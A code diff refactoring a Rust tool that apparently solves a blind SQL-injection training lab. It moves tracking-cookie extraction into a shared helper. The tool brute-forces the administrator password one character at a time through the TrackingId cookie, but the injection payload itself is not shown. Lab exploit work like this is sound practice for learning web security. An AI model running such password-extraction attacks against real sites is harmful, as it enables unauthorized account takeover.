@@ -1,17 +1,12 @@
 use rayon::prelude::*;
-use regex::Regex;
 use reqwest::header::COOKIE;
 use sql_injection::{
-    HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, login_as_administrator,
+    HTTP_CLIENT, check_is_lab_solved, generate_clap_parser, get_tracking_id, login_as_administrator,
 };
 use std::sync::{
-    Arc, LazyLock,
+    Arc,
     atomic::{AtomicBool, Ordering},
 };
-
-static TRACKING_ID_REGEX: LazyLock<Regex> = LazyLock::new(|| {
-    Regex::new(r"TrackingId=(.+?);").expect("[-] Failed to generate TRACKING_ID_REGEX")
-});
 
 static CHARACTERS: &str = "abcdefghijklmnopqrstuvwxyz0123456789";
 
@@ -43,26 +38,7 @@ fn main() {
 
     let lab_url = args.lab_url.as_str().trim_end_matches("/");
 
-    logger::info("Fetching the Tracking ID");
-
-    let response = HTTP_CLIENT
-        .get(lab_url)
-        .send()
-        .expect("Failed to send a GET request to /");
-
-    let set_cookie = response
-        .headers()
-        .get("set-cookie")
-        .expect("[-] set-cookie not found");
-
-    let tracking_id = TRACKING_ID_REGEX
-        .captures(set_cookie.to_str().expect("[-] Failed to convert to &str"))
-        .expect("[-] No captures found")
-        .get(1)
-        .expect("[-] No capture groups found. Unable to get capture group 1")
-        .as_str();
-
-    logger::success(format!("Got th Tracking ID: {}", tracking_id).as_ref());
+    let tracking_id = get_tracking_id(lab_url);
 
     logger::info("Now brute-forcing the `administrator` password");
 
@@ -76,7 +52,8 @@ fn main() {
                 return None;
             }
 
-            let result: Option<char> = brute_force_admin_password(lab_url, tracking_id, &position);
+            let result: Option<char> =
+                brute_force_admin_password(lab_url, tracking_id.as_ref(), &position);
 
             match result {
                 Some(value) => Some((index, value)),
